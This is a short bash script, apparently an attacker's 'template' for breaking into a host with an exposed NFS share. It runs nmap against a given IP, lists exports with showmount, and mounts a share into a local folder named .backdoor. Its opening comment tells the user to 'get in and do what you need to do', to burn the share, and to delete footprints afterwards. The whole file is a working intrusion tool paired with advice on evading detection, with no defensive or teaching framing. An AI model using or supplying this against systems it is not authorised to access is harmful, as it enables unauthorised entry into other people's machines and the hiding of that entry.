#!/bin/bash

<<###

This is less of a script but more of a "template" for getting in if they have nsf exposed.

If NSF is exposed, you can mount a share and get in that way. You can see this if you run nmap on the ip.

This does require having showmount installed.

Once the share is mounted, navigate to the .backdoor, get in and do what you need to do. Burn the share after you're done, and delete your footprints before you leave.

###

if [ -z "$1" ]; then
    echo "Usage: $0 <IP_ADDRESS>"
    exit 1
fi

IP_ADDRESS=$1

echo "Running nmap to check for NFS on $IP_ADDRESS..."
NFS_PORT=$(nmap -p- --open -T4 $IP_ADDRESS | grep -i nfs | awk '{print $1}' | cut -d '/' -f 1)

if [ -n "$NFS_PORT" ]; then
    echo "NFS found on port $NFS_PORT"
    mkdir -p .backdoor
    echo "Checking for visible shares..."
    SHOWMOUNT_OUTPUT=$(showmount -e $IP_ADDRESS)
    ENTRY=$(echo "$SHOWMOUNT_OUTPUT" | grep -v "Export list" | awk '{print $1}')
    if [ -n "$ENTRY" ]; then
        echo "Visible share found: $ENTRY"
        echo "Mounting the share..."
        mount -t nfs $IP_ADDRESS:$ENTRY .backdoor -nolock
        echo "Share mounted at .backdoor"
    else
        echo "No visible shares found."
    fi
else
    echo "No NFS service found on $IP_ADDRESS"
fi